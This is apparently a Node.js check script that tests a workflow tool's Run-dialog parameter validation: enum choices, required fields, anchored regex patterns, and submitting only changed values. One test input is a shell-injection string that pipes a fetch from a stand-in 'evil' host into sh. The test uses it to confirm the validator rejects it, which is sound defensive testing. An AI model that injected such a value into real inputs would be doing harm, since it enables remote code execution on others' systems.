#!/usr/bin/env node
// Hold the Run dialog's parameter form to the engine's `param_schema` rules.
//
//     npm run check:params
//
// The dialog validates before submitting so a caller sees "must be one of: dev,
// staging, prod" next to the field instead of a 400 after the round trip. That
// only helps if it agrees with the engine (`DagSpec` validation in
// crates/dagron-core/src/dag.rs): an empty value is "not supplied", `enum` is
// exact, `pattern` matches the whole value. It must also send only what the
// caller changed, so the spec's defaults stay the spec's.
//
// No test framework, matching the other check scripts.

import assert from "node:assert/strict";
import { register } from "node:module";

register("./alias-hook.mjs", import.meta.url);

const { paramFields, fieldError, changedValues } = await import("@/lib/run-params");

const fields = paramFields(
  { tf_dir: "./infra", environment: "staging", note: "" },
  {
    tf_dir: { required: true, pattern: "[A-Za-z0-9_./-]+", description: "Root module" },
    environment: { required: true, enum: ["dev", "staging", "prod"] },
  },
);
const by = Object.fromEntries(fields.map((f) => [f.name, f]));

assert.deepEqual(fields.map((f) => f.name), ["environment", "note", "tf_dir"], "one field per parameter, sorted");
assert.equal(by.environment.default, "staging");
assert.deepEqual(by.environment.choices, ["dev", "staging", "prod"]);
assert.equal(by.tf_dir.description, "Root module");
assert.equal(by.note.required, false, "a parameter without a schema entry is a plain optional field");

assert.equal(fieldError(by.environment, "prod"), null);
assert.equal(fieldError(by.environment, "prd"), "must be one of: dev, staging, prod");
assert.equal(fieldError(by.environment, ""), "required");
assert.equal(fieldError(by.note, ""), null, "empty optional is fine");
assert.equal(fieldError(by.tf_dir, "./infra/prod"), null);
assert.equal(
  fieldError(by.tf_dir, "./infra'; curl evil | sh; '"),
  "must match [A-Za-z0-9_./-]+",
  "the pattern is anchored: a matching prefix is not enough",
);

const broken = paramFields({ x: "" }, { x: { pattern: "(" } })[0];
assert.equal(fieldError(broken, "anything"), null, "a pattern JS cannot compile is left to the server");

assert.deepEqual(
  changedValues(fields, { environment: "prod", note: "", tf_dir: "./infra" }),
  { environment: "prod" },
  "only changed values are sent",
);
assert.deepEqual(changedValues(fields, {}), {}, "untouched form sends nothing");

console.log("check:params ok");
